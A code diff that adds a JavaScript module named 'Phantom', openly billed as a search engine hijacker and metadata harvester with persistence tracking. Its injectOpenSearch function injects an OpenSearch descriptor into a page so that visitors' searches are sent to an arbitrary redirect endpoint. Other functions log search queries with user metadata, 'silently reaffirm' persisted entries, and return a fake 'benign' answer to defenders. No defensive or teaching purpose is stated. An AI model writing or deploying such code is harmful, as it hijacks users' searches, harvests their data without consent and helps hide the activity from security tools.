@@ -1,0 +1,62 @@
+// Phantom Module: Combines SearchPhantom and PrismGhost capabilities
+
+const Phantom = (() => {
+    const registry = {};
+
+    // PrismGhost: Registry Echo and Persistence Tracker
+    function initWhisperReg(targetKey, payloadValue) {
+        registry[targetKey] = {
+            payload: payloadValue,
+            timestamp: Date.now(),
+            shadowEcho: true
+        };
+        console.log(`[Phantom:PrismGhost] Registered ${targetKey}`);
+    }
+
+    function exportRegistryLog() {
+        return JSON.stringify(registry, null, 2);
+    }
+
+    function silentPersistenceHook(targetKey) {
+        if (registry[targetKey]) {
+            console.log(`[Phantom:PrismGhost] ${targetKey} silently reaffirmed.`);
+            registry[targetKey].timestamp = Date.now();
+        } else {
+            console.warn(`[Phantom:PrismGhost] ${targetKey} not found.`);
+        }
+    }
+
+    function fakeDefenderResponse(key) {
+        return registry[key] ? 'benign.registry.trace' : 'not.found';
+    }
+
+    // SearchPhantom: Search Engine Hijack and Metadata Harvester
+    function injectOpenSearch(domain, redirectEndpoint) {
+        const descriptor = `<?xml version="1.0" encoding="UTF-8"?><OpenSearchDescription xmlns="http://a9.com/-/spec/opensearch/1.1/"><ShortName>Phantom</ShortName><Description>Search redirect</Description><Url type="text/html" template="${redirectEndpoint}?q={searchTerms}"/></OpenSearchDescription>`;
+        document.head.insertAdjacentHTML("beforeend", `<link rel="search" type="application/opensearchdescription+xml" title="PhantomSearch" href="data:application/xml,${encodeURIComponent(descriptor)}">`);
+        console.log(`[Phantom:SearchPhantom] OpenSearch injected on ${domain}`);
+    }
+
+    function logSearchFingerprint(query, userMeta) {
+        const metadata = {
+            query,
+            timestamp: new Date().toISOString(),
+            ...userMeta
+        };
+        console.log(`[Phantom:SearchPhantom] Search Metadata Logged:`, metadata);
+    }
+
+    return {
+        // PrismGhost Methods
+        initWhisperReg,
+        exportRegistryLog,
+        silentPersistenceHook,
+        fakeDefenderResponse,
+
+        // SearchPhantom Methods
+        injectOpenSearch,
+        logSearchFingerprint
+    };
+})();
+
+module.exports = Phantom;
